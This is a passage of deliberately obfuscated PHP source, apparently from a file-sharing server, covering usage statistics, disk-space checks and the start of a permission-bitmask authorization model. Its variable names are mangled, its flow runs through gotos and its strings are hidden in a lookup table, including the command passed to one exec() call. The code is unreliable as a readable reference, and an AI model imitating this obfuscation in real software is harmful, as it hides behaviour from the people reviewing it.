end($Dğ––ç”„˜); $Fá«ãï„ŸÆ = date($aøç†›ÒŒ[1597], strtotime($aøç†›ÒŒ[1598])); if ($aŒË†ª˜[$aøç†›ÒŒ[220]] == $Fá«ãï„ŸÆ) { return $Dğ––ç”„˜; } $C¢äİŒ“›ç = strtotime($aŒË†ª˜[$aøç†›ÒŒ[220]]); } goto B¤’ˆá‹®ò; B¤’ˆá‹®ò: if (!isset($C¢äİŒ“›ç)) { $bå¡¨×„¨ = $a¦ªÑ…•äƒ == $aøç†›ÒŒ[557] ? $aøç†›ÒŒ[501] : $aøç†›ÒŒ[775]; $C¢äİŒ“›ç = Model($bå¡¨×„¨)->min($aøç†›ÒŒ[192]); } $eÂè»­‹ç = $aøç†›ÒŒ[1599] . ucfirst($a¦ªÑ…•äƒ); $cŒéÌ °­ = $this->dateList($C¢äİŒ“›ç); goto fŠ ùã¼‹; fŠ ùã¼‹: foreach ($cŒéÌ °­ as $Fá«ãï„ŸÆ) { $this->{$eÂè»­‹ç}($Fá«ãï„ŸÆ); } return $this->listData(); goto dÏ­Óëƒù¹; dÏ­Óëƒù¹: } private function dateList($EÁ«£ÖŒ†÷) { $DÄ‰¸İÆäå =& $_SERVER[Š‰]; $a«¥½¥êíø = $EÁ«£ÖŒ†÷; $e¦å†è†àˆ = strtotime($DÄ‰¸İÆäå[1598]); $BàÅğø¬© = array(); while ($a«¥½¥êíø <= $e¦å†è†àˆ) { $BàÅğø¬©[] = date($DÄ‰¸İÆäå[1597], $a«¥½¥êíø); $a«¥½¥êíø = strtotime($DÄ‰¸İÆäå[1600], $a«¥½¥êíø); } return $BàÅğø¬©; } public function _recordUser($aèÒ†‹½˜í = '') { goto BÈ†½¡£Ù÷; FõùÎÀÓ‚‰: $C‰–ÊˆĞ»´ = Model($b’ìµÊ¥Ñ[501])->where($DØãÓÃ„©Û)->count($b’ìµÊ¥Ñ[1500]); $DØãÓÃ„©Û[$b’ìµÊ¥Ñ[29]] = $b’ìµÊ¥Ñ[1603]; $D”¯ĞìË²ª = Model($b’ìµÊ¥Ñ[1604])->where($DØãÓÃ„©Û)->count($b’ìµÊ¥Ñ[1605]); goto FÍÚ”‡óÕ; FÍÚ”‡óÕ: $DËŒÀÇ› = array($b’ìµÊ¥Ñ[220] => $aèÒ†‹½˜í, $b’ìµÊ¥Ñ[713] => (int) $cßÛèÁç, $b’ìµÊ¥Ñ[1590] => (int) $C‰–ÊˆĞ»´, $b’ìµÊ¥Ñ[1591] => (int) $D”¯ĞìË²ª); return $this->insert($DËŒÀÇ›); goto E‡ï§ø“¨; B…˜¸¦—‡¼: $DØãÓÃ„©Û = array($b’ìµÊ¥Ñ[192] => array($b’ìµÊ¥Ñ[947], $a¡¢»½˜ç¤)); $cßÛèÁç = Model($b’ìµÊ¥Ñ[501])->where($DØãÓÃ„©Û)->count($b’ìµÊ¥Ñ[1500]); $DØãÓÃ„©Û[$b’ìµÊ¥Ñ[192]] = array($b’ìµÊ¥Ñ[329], array($Dà‘²Ş†¡›, $a¡¢»½˜ç¤)); goto FõùÎÀÓ‚‰; BÈ†½¡£Ù÷: $b’ìµÊ¥Ñ =& $_SERVER[Š‰]; $Dà‘²Ş†¡› = strtotime(date($b’ìµÊ¥Ñ[1601], strtotime($aèÒ†‹½˜í))); $a¡¢»½˜ç¤ = strtotime(date($b’ìµÊ¥Ñ[1602], strtotime($aèÒ†‹½˜í))); goto B…˜¸¦—‡¼; E‡ï§ø“¨: } public function _recordStore($eÉŒì™âÁä = '') { goto DÀŠŞ²î–œ; Dñ‰¥ôô¦ê: $fª¶Êà‰âº[$Dˆö—¶¶äÌ[398]] = 1; $EºÃ£®‘ = Model($Dˆö—¶¶äÌ[775])->where($fª¶Êà‰âº)->sum($Dˆö—¶¶äÌ[77]); $fª¶Êà‰âº[$Dˆö—¶¶äÌ[398]] = 2; goto A‚¢‘ˆº°Ë; DÀŠŞ²î–œ: $Dˆö—¶¶äÌ =& $_SERVER[Š‰]; $e ÁâºĞµ = strtotime(date($Dˆö—¶¶äÌ[1602], strtotime($eÉŒì™âÁä))); $fª¶Êà‰âº = array($Dˆö—¶¶äÌ[192] => array($Dˆö—¶¶äÌ[947], $e ÁâºĞµ)); goto FÒ¸Ëğƒ­ö; A‚¢‘ˆº°Ë: $Aƒ¢Î½½Œ = Model($Dˆö—¶¶äÌ[775])->where($fª¶Êà‰âº)->sum($Dˆö—¶¶äÌ[77]); $f›Æº¦‘šÙ = array($Dˆö—¶¶äÌ[220] => $eÉŒì™âÁä, $Dˆö—¶¶äÌ[711] => (int) $C±àŸª÷¯, $Dˆö—¶¶äÌ[1594] => (int) $e‘¨½Á”¨Ã, $Dˆö—¶¶äÌ[1595] => (int) $EºÃ£®‘, $Dˆö—¶¶äÌ[1596] => (int) $Aƒ¢Î½½Œ); return $this->insert($f›Æº¦‘šÙ); goto eæäĞ¨Ö²ğ; FÒ¸Ëğƒ­ö: $e‘¨½Á”¨Ã = Model($Dˆö—¶¶äÌ[444])->where($fª¶Êà‰âº)->sum($Dˆö—¶¶äÌ[77]); $fª¶Êà‰âº[$Dˆö—¶¶äÌ[397]] = 0; $C±àŸª÷¯ = Model($Dˆö—¶¶äÌ[775])->where($fª¶Êà‰âº)->sum($Dˆö—¶¶äÌ[77]); goto Dñ‰¥ôô¦ê; eæäĞ¨Ö²ğ: } public function trend($AÂ‚´ïŸŒ, $e–šÎ»Œ—) { goto añ–í¬ÎåØ; f‰ğß×ó: return $d¦«ª†ŠÃ; goto Cö¤·ÕšÊµ; BŒ©œğŒ¢Ë: if ($F™§§ŸŒŸ && $e–šÎ»Œ— != $DÀİÇ‚ƒËÕ[1474]) { $cëĞŠçíÊˆ = $F™§§ŸŒŸ[0][$DÀİÇ‚ƒËÕ[220]]; $cî…õÌ³È‹ = $this->validDate($e–šÎ»Œ—, $cëĞŠçíÊˆ); $f®éÃİ´æ£ = array(); $F‰ï„Šù = array_to_keyvalue($F™§§ŸŒŸ, $DÀİÇ‚ƒËÕ[220]); foreach ($cî…õÌ³È‹ as $AÃóÔª ¯¿) { if (isset($F‰ï„Šù[$AÃóÔª ¯¿])) { $DÎÓ²îë¨È = $F‰ï„Šù[$AÃóÔª ¯¿]; } else { $DÎÓ²îë¨È = end($F™§§ŸŒŸ); $DÎÓ²îë¨È[$DÀİÇ‚ƒËÕ[220]] = $AÃóÔª ¯¿; if ($AÂ‚´ïŸŒ == $DÀİÇ‚ƒËÕ[557]) { $DÎÓ²îë¨È[$DÀİÇ‚ƒËÕ[1590]] = $DÎÓ²îë¨È[$DÀİÇ‚ƒËÕ[1591]] = 0; } } $f®éÃİ´æ£[] = $DÎÓ²îë¨È; } $F™§§ŸŒŸ = $f®éÃİ´æ£; } $BÊˆ³âÅËÃ = array($DÀİÇ‚ƒËÕ[557] => array($DÀİÇ‚ƒËÕ[713] => LNG($DÀİÇ‚ƒËÕ[1606]), $DÀİÇ‚ƒËÕ[1590] => LNG($DÀİÇ‚ƒËÕ[1607]), $DÀİÇ‚ƒËÕ[1591] => LNG($DÀİÇ‚ƒËÕ[1608])), $DÀİÇ‚ƒËÕ[1592] => array($DÀİÇ‚ƒËÕ[711] => LNG($DÀİÇ‚ƒËÕ[1609]), $DÀİÇ‚ƒËÕ[1594] => LNG($DÀİÇ‚ƒËÕ[1610]), $DÀİÇ‚ƒËÕ[1595] => LNG($DÀİÇ‚ƒËÕ[1611]), $DÀİÇ‚ƒËÕ[1596] => LNG($DÀİÇ‚ƒËÕ[1612]))); $d·ë·ÒàêÛ = array($DÀİÇ‚ƒËÕ[557] => $DÀİÇ‚ƒËÕ[1613], $DÀİÇ‚ƒËÕ[1592] => $DÀİÇ‚ƒËÕ[77]); goto F •Û´¯–; añ–í¬ÎåØ: $DÀİÇ‚ƒËÕ =& $_SERVER[Š‰]; if (!$this->init($AÂ‚´ïŸŒ)) { return !1; } $F™§§ŸŒŸ = $this->trendList($AÂ‚´ïŸŒ); goto BŒ©œğŒ¢Ë; F •Û´¯–: if (empty($F™§§ŸŒŸ)) { $AÃóÔª ¯¿ = date($DÀİÇ‚ƒËÕ[1597], strtotime($DÀİÇ‚ƒËÕ[1598])); $b•éÃ›‚‘‡ = array($DÀİÇ‚ƒËÕ[220] => $AÃóÔª ¯¿); foreach ($BÊˆ³âÅËÃ[$AÂ‚´ïŸŒ] as $eí¾È½ê¤¢ => $A£ÇÎ¸ĞÃ‹) { $b•éÃ›‚‘‡[$eí¾È½ê¤¢] = 0; } $F™§§ŸŒŸ[] = $b•éÃ›‚‘‡; } $d¦«ª†ŠÃ = array(); foreach ($F™§§ŸŒŸ as $A£ÇÎ¸ĞÃ‹) { if ($AÂ‚´ïŸŒ == $DÀİÇ‚ƒËÕ[1592] && $A£ÇÎ¸ĞÃ‹[$DÀİÇ‚ƒËÕ[1594]] > $A£ÇÎ¸ĞÃ‹[$DÀİÇ‚ƒËÕ[711]]) { $A£ÇÎ¸ĞÃ‹[$DÀİÇ‚ƒËÕ[1594]] = $A£ÇÎ¸ĞÃ‹[$DÀİÇ‚ƒËÕ[711]]; } foreach ($BÊˆ³âÅËÃ[$AÂ‚´ïŸŒ] as $eí¾È½ê¤¢ => $Aêì˜­—»£) { $DÎÓ²îë¨È = array($DÀİÇ‚ƒËÕ[220] => $A£ÇÎ¸ĞÃ‹[$DÀİÇ‚ƒËÕ[220]], $DÀİÇ‚ƒËÕ[1405] => $Aêì˜­—»£); $DÎÓ²îë¨È[$d·ë·ÒàêÛ[$AÂ‚´ïŸŒ]] = isset($A£ÇÎ¸ĞÃ‹[$eí¾È½ê¤¢]) ? $A£ÇÎ¸ĞÃ‹[$eí¾È½ê¤¢] : 0; $d¦«ª†ŠÃ[] = $DÎÓ²îë¨È; } } goto f‰ğß×ó; Cö¤·ÕšÊµ: } public function validDate($F˜¼×Çºš³, $AŸ²†¾ó) { goto cìÌÏàÉò; cìÌÏàÉò: $bŒÍÙÛ›Ò® =& $_SERVER[Š‰]; $b÷¸¿‰à¦Û = date($bŒÍÙÛ›Ò®[1597], strtotime($bŒÍÙÛ›Ò®[1598])); $B­Şæ¬Ó› = array($b÷¸¿‰à¦Û); goto F†é„Ğê¯é; B‚¥œÅèÈ: return $B­Şæ¬Ó›; goto DÒÊ¯Ò‚İ; F†é„Ğê¯é: switch ($F˜¼×Çºš³) { case $bŒÍÙÛ›Ò®[1481]: $d‹‰å…à¹ä = mktime(0, 0, 0, date($bŒÍÙÛ›Ò®[1614]), date($bŒÍÙÛ›Ò®[1226]) - date($bŒÍÙÛ›Ò®[1288]) + 7 - 7, date($bŒÍÙÛ›Ò®[1615])); $Fİâ‚½Í‚ = 0; do { $F°÷‰«èê = date($bŒÍÙÛ›Ò®[1597], $d‹‰å…à¹ä - 3600 * 24 * 7 * $Fİâ‚½Í‚); $B­Şæ¬Ó›[] = $F°÷‰«èê; $Fİâ‚½Í‚++; } while ($AŸ²†¾ó < $F°÷‰«èê); break; case $bŒÍÙÛ›Ò®[1479]: $Fİâ‚½Í‚ = 1; do { $aŠ…¯²™Œå = date($bŒÍÙÛ›Ò®[1616], strtotime("\x2d\x20{$Fİâ‚½Í‚}\x20\x6d\157\x6e\x74\x68\x73")); $B­Şæ¬Ó›[] = $aŠ…¯²™Œå; $Fİâ‚½Í‚++; } while ($AŸ²†¾ó < $aŠ…¯²™Œå); break; case $bŒÍÙÛ›Ò®[1617]: $fùÔÕ»¶ÎŒ = (int) date($bŒÍÙÛ›Ò®[1615], strtotime($AŸ²†¾ó)); $Bà“Ô‰š´† = (int) date($bŒÍÙÛ›Ò®[1615]); if ($fùÔÕ»¶ÎŒ >= $Bà“Ô‰š´†) { break; } for ($fùÔÕ»¶ÎŒ; $fùÔÕ»¶ÎŒ < $Bà“Ô‰š´†; $fùÔÕ»¶ÎŒ++) { $B­Şæ¬Ó›[] = $fùÔÕ»¶ÎŒ . $bŒÍÙÛ›Ò®[1618]; } break; default: break; } if ($AŸ²†¾ó > end($B­Şæ¬Ó›)) { array_pop($B­Şæ¬Ó›); } sort($B­Şæ¬Ó›); goto B‚¥œÅèÈ; DÒÊ¯Ò‚İ: } public function listTable($EîËĞç‡) { $bâòÕã…ñ = ucfirst($EîËĞç‡); return Model($bâòÕã…ñ)->listData(); } public function option($AŸ³‹£©Ùî) { $D¡®ªŠÈñ = $_SERVER[Š‰][1619] . ucfirst($AŸ³‹£©Ùî); return $this->{$D¡®ªŠÈñ}(); } private function optionUser() { goto dÓ¼©Ä•Ã—; dÓ¼©Ä•Ã—: $e–¨ÍÑÑĞÏ =& $_SERVER[Š‰]; $Fˆ›ÊÀ«¡æ = Model($e–¨ÍÑÑĞÏ[501])->count($e–¨ÍÑÑĞÏ[1500]); $Fç­ ÷¿êà = Model($e–¨ÍÑÑĞÏ[501])->where($e–¨ÍÑÑĞÏ[1620])->count($e–¨ÍÑÑĞÏ[1500]); goto bç“ä¨…¡; AîøéŠˆÔß: $dÇĞ¾´‘¾ = array($e–¨ÍÑÑĞÏ[1621] => array($e–¨ÍÑÑĞÏ[948], $fæĞğÌ¥îœ)); $d•¬Íİ¦´œ = Model($e–¨ÍÑÑĞÏ[501])->where($dÇĞ¾´‘¾)->count($e–¨ÍÑÑĞÏ[1500]); return array($e–¨ÍÑÑĞÏ[708] => (int) $Fˆ›ÊÀ«¡æ, $e–¨ÍÑÑĞÏ[1622] => (int) ($Fˆ›ÊÀ«¡æ - $Fç­ ÷¿êà), $e–¨ÍÑÑĞÏ[1623] => (int) $Fç­ ÷¿êà, $e–¨ÍÑÑĞÏ[1624] => (int) $d•¬Íİ¦´œ, $e–¨ÍÑÑĞÏ[1625] => $DôÌÖÀ¬Æé); goto c‰¹ÖÄ·ÆĞ; bç“ä¨…¡: $DÄõÛ­‹¦Õ = intval($GLOBALS[$e–¨ÍÑÑĞÏ[6]][$e–¨ÍÑÑĞÏ[345]][$e–¨ÍÑÑĞÏ[1459]]) / 3600; $fæĞğÌ¥îœ = strtotime("\x2d{$DÄõÛ­‹¦Õ}\x20\x68\x6f\165\162\x73"); $dÇĞ¾´‘¾ = array($e–¨ÍÑÑĞÏ[1621] => array($e–¨ÍÑÑĞÏ[948], $fæĞğÌ¥îœ)); goto F‹àÑçÔ’…; F‹àÑçÔ’…: $DôÌÖÀ¬Æé = (int) Model($e–¨ÍÑÑĞÏ[501])->where($dÇĞ¾´‘¾)->count($e–¨ÍÑÑĞÏ[1500]); if (!$DôÌÖÀ¬Æé) { $DôÌÖÀ¬Æé = 1; } $fæĞğÌ¥îœ = strtotime(date($e–¨ÍÑÑĞÏ[1601])); goto AîøéŠˆÔß; c‰¹ÖÄ·ÆĞ: } private function optionFile() { goto DÆçÈ¬ ; DÆçÈ¬ : $DßÄˆÏ¯Æ÷ =& $_SERVER[Š‰]; $F³‰ÕáÖÜê = $this->sourceSize(); $FÖ±‘‘İ = $F³‰ÕáÖÜê[$DßÄˆÏ¯Æ÷[77]]; goto d¾öºÖ„ìÀ; d¾öºÖ„ìÀ: $bŒçÍß†Ê = $F³‰ÕáÖÜê[$DßÄˆÏ¯Æ÷[1594]]; $e«¾ˆ‹¶‹Ñ = Model($DßÄˆÏ¯Æ÷[775])->where(array($DßÄˆÏ¯Æ÷[397] => 0))->count($DßÄˆÏ¯Æ÷[390]); $BÚ¸¹™‹´ = array($DßÄˆÏ¯Æ÷[397] => 0, $DßÄˆÏ¯Æ÷[192] => array($DßÄˆÏ¯Æ÷[948], strtotime(date($DßÄˆÏ¯Æ÷[1601])))); goto D‰Ïª¬£­; D‰Ïª¬£­: $f³µçŞ­¶ä = Model($DßÄˆÏ¯Æ÷[775])->where($BÚ¸¹™‹´)->sum($DßÄˆÏ¯Æ÷[77]); $d©ß¬óØî = Model($DßÄˆÏ¯Æ÷[775])->where($BÚ¸¹™‹´)->count($DßÄˆÏ¯Æ÷[390]); return array($DßÄˆÏ¯Æ÷[711] => $FÖ±‘‘İ, $DßÄˆÏ¯Æ÷[1594] => $bŒçÍß†Ê, $DßÄˆÏ¯Æ÷[1626] => $FÖ±‘‘İ - $bŒçÍß†Ê, $DßÄˆÏ¯Æ÷[1627] => (int) $f³µçŞ­¶ä, $DßÄˆÏ¯Æ÷[713] => (int) $e«¾ˆ‹¶‹Ñ, $DßÄˆÏ¯Æ÷[1628] => (int) $d©ß¬óØî); goto BŠ×™³ÔÍê; BŠ×™³ÔÍê: } private function optionAccess() { $cÄùÔ¢“ñ =& $_SERVER[Š‰]; return array($cÄùÔ¢“ñ[708] => $this->typeLogCnt(), $cÄùÔ¢“ñ[106] => $this->typeLogCnt($cÄùÔ¢“ñ[106]), $cÄùÔ¢“ñ[424] => $this->typeLogCnt($cÄùÔ¢“ñ[424]), $cÄùÔ¢“ñ[1629] => $this->typeLogCnt($cÄùÔ¢“ñ[1629]), $cÄùÔ¢“ñ[1630] => $this->typeLogCnt($cÄùÔ¢“ñ[1630]), $cÄùÔ¢“ñ[557] => $this->typeLogCnt($cÄùÔ¢“ñ[33], $cÄùÔ¢“ñ[1605])); } private function typeLogCnt($dÔ“Ğ¶ÒŞ = '', $A“»Ù†àŠí = "\x69\x64") { goto EÍÎŞã»Êê; EÇç›†É“ˆ: return (int) $F©©Ê©¨¹ç; goto Còğí‚İÜ; EÍÎŞã»Êê: $Fß£–œº˜à =& $_SERVER[Š‰]; $d´ ¶¿ï = array($Fß£–œº˜à[106] => array($Fß£–œº˜à[1631], $Fß£–œº˜à[1632]), $Fß£–œº˜à[424] => array($Fß£–œº˜à[1633], $Fß£–œº˜à[1634]), $Fß£–œº˜à[1629] => array($Fß£–œº˜à[1635], $Fß£–œº˜à[1636], $Fß£–œº˜à[1637]), $Fß£–œº˜à[1630] => array($Fß£–œº˜à[1638], $Fß£–œº˜à[1639]), $Fß£–œº˜à[1640] => array($Fß£–œº˜à[1641], $Fß£–œº˜à[1642], $Fß£–œº˜à[1643])); $fôÂ…ò±Ë = strtotime(date($Fß£–œº˜à[1601])); goto e–ô«¿èÏæ; e–ô«¿èÏæ: $E¼ñ®Ñô’‰ = array($Fß£–œº˜à[192] => array($Fß£–œº˜à[948], $fôÂ…ò±Ë)); if ($dÔ“Ğ¶ÒŞ) { $E¼ñ®Ñô’‰[$Fß£–œº˜à[29]] = array($Fß£–œº˜à[7], $d´ ¶¿ï[$dÔ“Ğ¶ÒŞ]); } $F©©Ê©¨¹ç = Model($Fß£–œº˜à[1604])->where($E¼ñ®Ñô’‰)->count($A“»Ù†àŠí); goto EÇç›†É“ˆ; Còğí‚İÜ: } private function optionServer() { goto dÛÌÍ½ßèö; dÛÌÍ½ßèö: $fé·¾‹‡¼ =& $_SERVER[Š‰]; $b®‹¥Ò’Î„ = $this->diskDriver(); $còËì—ÒÍê = KodIO::defaultDriver(); goto fôÈî†Ğ½ó; Fé“†£ªÄĞ: if ($cŸáÃÑ¸¸ == $fé·¾‹‡¼[738]) { $aö±¾ÈŸ•ß = explode($fé·¾‹‡¼[1141], $D¤×ê£³Ü¬[$fé·¾‹‡¼[908]]); $cŸáÃÑ¸¸ = $aö±¾ÈŸ•ß[0]; } if ($cŸáÃÑ¸¸ == $fé·¾‹‡¼[741] || $cŸáÃÑ¸¸ == $fé·¾‹‡¼[742]) { $B©¾®Ã  = Model()->db()->query($fé·¾‹‡¼[1644]); $BÌãïŠ´¬Ø = $B©¾®Ã [0] && isset($B©¾®Ã [0][$fé·¾‹‡¼[1404]]) ? $B©¾®Ã [0][$fé·¾‹‡¼[1404]] : 0; $cŸáÃÑ¸¸ = $fé·¾‹‡¼[1645] . ($BÌãïŠ´¬Ø ? $fé·¾‹‡¼[8] . $BÌãïŠ´¬Ø : $fé·¾‹‡¼[33]); } $f±Šªµóø = $GLOBALS[$fé·¾‹‡¼[6]][$fé·¾‹‡¼[345]][$fé·¾‹‡¼[777]]; goto CÅ˜¿»ó…©; B£œâËÀˆ‡: $c¡‘¿öº¼ = $B±»Şœª¶÷[0]; $D¤×ê£³Ü¬ = $GLOBALS[$fé·¾‹‡¼[6]][$fé·¾‹‡¼[17]]; $cŸáÃÑ¸¸ = $D¤×ê£³Ü¬[$fé·¾‹‡¼[909]]; goto Fé“†£ªÄĞ; CÅ˜¿»ó…©: return array($fé·¾‹‡¼[1646] => $b®‹¥Ò’Î„ ? $b®‹¥Ò’Î„[$fé·¾‹‡¼[1647]] : 0, $fé·¾‹‡¼[1648] => $b®‹¥Ò’Î„ ? $b®‹¥Ò’Î„[$fé·¾‹‡¼[1649]] : 0, $fé·¾‹‡¼[1650] => (int) $còËì—ÒÍê[$fé·¾‹‡¼[1647]] * 1024 * 1024 * 1024, $fé·¾‹‡¼[1651] => (int) $cñ‹ßêø‹Ñ, $fé·¾‹‡¼[1652] => ucfirst($c¡‘¿öº¼), $fé·¾‹‡¼[1653] => $fé·¾‹‡¼[1654] . PHP_VERSION, $fé·¾‹‡¼[1655] => phpBuild64() ? 64 : 32, $fé·¾‹‡¼[707] => str_replace($fé·¾‹‡¼[1656], $fé·¾‹‡¼[925], $cŸáÃÑ¸¸), $fé·¾‹‡¼[345] => ucfirst($f±Šªµóø), $fé·¾‹‡¼[28] => $_SERVER[$fé·¾‹‡¼[1657]]); goto BöŠ®ŞÚ¥Ç; fôÈî†Ğ½ó: $D…ÚÅñ­È = array($fé·¾‹‡¼[768] => $còËì—ÒÍê[$fé·¾‹‡¼[388]]); $cñ‹ßêø‹Ñ = Model($fé·¾‹‡¼[444])->where($D…ÚÅñ­È)->sum($fé·¾‹‡¼[77]); $B±»Şœª¶÷ = explode($fé·¾‹‡¼[50], $_SERVER[$fé·¾‹‡¼[141]]); goto B£œâËÀˆ‡; BöŠ®ŞÚ¥Ç: } private function diskDriver() { goto f¬ «àĞä¡; f¬ «àĞä¡: $Eˆ–ÕòÁñõ =& $_SERVER[Š‰]; $aàøã°á™› = $Eˆ–ÕòÁñõ[8]; $EÅ¹ĞöƒõÀ = $GLOBALS[$Eˆ–ÕòÁñõ[6]][$Eˆ–ÕòÁñõ[1658]] == $Eˆ–ÕòÁñõ[1659]; goto f‹Èàº‡‹; f‹Èàº‡‹: if ($EÅ¹ĞöƒõÀ) { $aàøã°á™› = $Eˆ–ÕòÁñõ[1660]; if (function_exists($Eˆ–ÕòÁñõ[1661])) { exec($Eˆ–ÕòÁñõ[1662], $fİ¥â¡ˆõ¼); $aàøã°á™› = $fİ¥â¡ˆõ¼[1] . $Eˆ–ÕòÁñõ[8]; } } if (!file_exists($aàøã°á™›)) { return; } $Dì‚ñÔì½µ = @disk_total_space($aàøã°á™›); goto F©ç³–¼ÀÂ; F©ç³–¼ÀÂ: $aÄÖï‡ßî = $Dì‚ñÔì½µ - @disk_free_space($aàøã°á™›); return array($Eˆ–ÕòÁñõ[1647] => $Dì‚ñÔì½µ, $Eˆ–ÕòÁñõ[1649] => $aÄÖï‡ßî); goto aá«•àòØ; aá«•àòØ: } public function fileChart($F«µÄÃ×´¹) { goto cì—¦¨ôä; cì—¦¨ôä: $Bäîº°õêË =& $_SERVER[Š‰]; if (isset($F«µÄÃ×´¹[$Bäîº°õêË[1500]])) { return Model($Bäîº°õêË[775])->userFileTypeProfile($F«µÄÃ×´¹[$Bäîº°õêË[1500]]); } if (isset($F«µÄÃ×´¹[$Bäîº°õêË[1663]])) { return Model($Bäîº°õêË[775])->groupFileTypeProfile($F«µÄÃ×´¹[$Bäîº°õêË[1663]]); } goto d½Ú¶ µØâ; fÍ”è­ÇÔ: $dŸáÇ²¸º[$Bäîº°õêË[398]] = 2; $D±¯Â’¹¨¢ = Model($Bäîº°õêË[775])->where($dŸáÇ²¸º)->sum($Bäîº°õêË[77]); return array($Bäîº°õêË[711] => $dêŞ±¤Ğ—ï[$Bäîº°õêË[77]], $Bäîº°õêË[1594] => $dêŞ±¤Ğ—ï[$Bäîº°õêË[1594]], $Bäîº°õêË[1595] => (int) $b‚±¨Ã¡êÕ, $Bäîº°õêË[1596] => (int) $D±¯Â’¹¨¢); goto A­Ô»âŠŒ£; d½Ú¶ µØâ: $dêŞ±¤Ğ—ï = $this->sourceSize(); $dŸáÇ²¸º = array($Bäîº°õêË[472] => 0, $Bäîº°õêË[398] => 1); $b‚±¨Ã¡êÕ = Model($Bäîº°õêË[775])->where($dŸáÇ²¸º)->sum($Bäîº°õêË[77]); goto fÍ”è­ÇÔ; A­Ô»âŠŒ£: } private function sourceSize() { $BŞİ†âÂ„¬ =& $_SERVER[Š‰]; $cİ‘ŸƒçÏ³ = Model($BŞİ†âÂ„¬[775])->where(array($BŞİ†âÂ„¬[397] => 0))->sum($BŞİ†âÂ„¬[77]); $CÈ§§±˜á = Model($BŞİ†âÂ„¬[444])->sum($BŞİ†âÂ„¬[77]); if ($CÈ§§±˜á > $cİ‘ŸƒçÏ³) { $CÈ§§±˜á = $cİ‘ŸƒçÏ³; } return array($BŞİ†âÂ„¬[77] => (int) $cİ‘ŸƒçÏ³, $BŞİ†âÂ„¬[1594] => (int) $CÈ§§±˜á); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $C¸’†Ò¹‡‹ =& $_SERVER[Š‰]; $C¾´ˆ×ì¨æ = array(array($C¸’†Ò¹‡‹[407] => LNG($C¸’†Ò¹‡‹[1664]), $C¸’†Ò¹‡‹[1665] => $C¸’†Ò¹‡‹[1666], $C¸’†Ò¹‡‹[1667] => 1, $C¸’†Ò¹‡‹[1668] => 1, $C¸’†Ò¹‡‹[1669] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($C¸’†Ò¹‡‹[407] => LNG($C¸’†Ò¹‡‹[1670]), $C¸’†Ò¹‡‹[1665] => $C¸’†Ò¹‡‹[1671], $C¸’†Ò¹‡‹[1667] => 2, $C¸’†Ò¹‡‹[1668] => 1, $C¸’†Ò¹‡‹[1669] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($C¸’†Ò¹‡‹[407] => LNG($C¸’†Ò¹‡‹[1672]), $C¸’†Ò¹‡‹[1665] => $C¸’†Ò¹‡‹[1673], $C¸’†Ò¹‡‹[1667] => 3, $C¸’†Ò¹‡‹[1668] => 1, $C¸’†Ò¹‡‹[1669] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($C¸’†Ò¹‡‹[407] => LNG($C¸’†Ò¹‡‹[1674]), $C¸’†Ò¹‡‹[1665] => $C¸’†Ò¹‡‹[1675], $C¸’†Ò¹‡‹[1667] => 4, $C¸’†Ò¹‡‹[1668] => 1, $C¸’†Ò¹‡‹[1669] => self::AUTH_SHOW | self::AUTH_VIEW), array($C¸’†Ò¹‡‹[407] => LNG($C¸’†Ò¹‡‹[1676]), $C¸’†Ò¹‡‹[1665] => $C¸’†Ò¹‡‹[1677], $C¸’†Ò¹‡‹[1667] => 5, $C¸’†Ò¹‡‹[1668] => 1, $C¸’†Ò¹‡‹[1669] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($C¸’†Ò¹‡‹[407] => LNG($C¸’†Ò¹‡‹[1678]), $C¸’†Ò¹‡‹[1665] => $C¸’†Ò¹‡‹[1679], $C¸’†Ò¹‡‹[1667] => 6, $C¸’†Ò¹‡‹[1668] => 1, $C¸’†Ò¹‡‹[1669] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($C¸’†Ò¹‡‹[407] => LNG($C¸’†Ò¹‡‹[1680]), $C¸’†Ò¹‡‹[1665] => $C¸’†Ò¹‡‹[1681], $C¸’†Ò¹‡‹[1667] => 7, $C¸’†Ò¹‡‹[1668] => 1, $C¸’†Ò¹‡‹[1669] => 0)); return $C¾´ˆ×ì¨æ; } public static function authCheck($b´¢Ê‚œĞƒ, $Fõ³Ô˜ªÜ) { $b´¢Ê‚œĞƒ = intval($b´¢Ê‚œĞƒ); if ($GLOBALS[$_SERVER[Š‰][479]]) { return !0; } if ($b´¢Ê‚œĞƒ <= 0) { return !1; } if (($b´¢Ê‚œĞƒ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($b´¢Ê‚œĞƒ & $Fõ³Ô˜ªÜ); } public static function authCheckShow($dàö—Ù¹È´) { return self::authCheck($dàö—Ù¹È´, self::AUTH_SHOW); } public static function authCheckView($A°Ì·ëöÓ) { return self::authCheck($A°Ì·ëöÓ, self::AUTH_VIEW); } public static function authCheckDownload($bæ¡¾…•¡¡) { return self::authCheck($bæ¡¾…•¡¡, self::AUTH_DOWNLOAD); } public static function authCheckUpload($DÊ´Ä‘ßÅë) { return self::authCheck($DÊ´Ä‘ßÅë, self::AUTH_UPLOAD); } public static function authCheckEdit($fªõ“†¾ë°) { return self::authCheck($fªõ“†¾ë°, self::AUTH_EDIT); } public static function authCheckRemove($a³›Š ‹Ù) { 